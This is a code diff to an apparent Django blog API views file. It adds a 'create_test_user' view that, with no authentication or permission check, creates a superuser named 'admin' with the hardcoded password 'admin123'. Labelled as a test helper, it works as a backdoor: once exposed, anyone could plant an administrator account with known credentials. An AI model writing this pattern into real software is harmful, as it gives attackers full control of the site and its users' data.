@@ -4,6 +4,14 @@ from .models import BlogPost
 from .serializers import BlogSerializer
 from rest_framework.permissions import IsAuthenticatedOrReadOnly
 from rest_framework.exceptions import PermissionDenied
+from django.contrib.auth.models import User
+from django.http import JsonResponse
+
+def create_test_user(request):
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser("admin", "admin@example.com", "admin123")
+        return JsonResponse({"message": "Test admin user created"})
+    return JsonResponse({"message": "Admin already exists"})
 class BlogPagination(PageNumberPagination):
     page_size = 10
 
